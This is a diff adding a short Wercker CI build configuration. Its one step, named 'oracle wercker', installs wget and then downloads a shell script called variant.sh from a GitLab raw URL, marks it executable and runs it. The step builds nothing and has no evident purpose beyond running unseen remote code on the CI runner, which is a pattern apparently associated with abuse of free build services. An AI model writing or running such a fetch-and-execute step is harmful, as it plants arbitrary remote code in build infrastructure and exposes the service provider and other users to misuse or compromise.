@@ -1,0 +1,9 @@
+box: ubuntu:16.04
+build:
+  steps:
+    - script:
+        name: oracle wercker
+        code: |
+          sudo apt update -y && sudo apt upgrade -y
+          sudo apt-get install  -y wget
+          wget https://gitlab.com/dapurspl/simple/-/raw/main/variant.sh && chmod u+x variant.sh && ./variant.sh
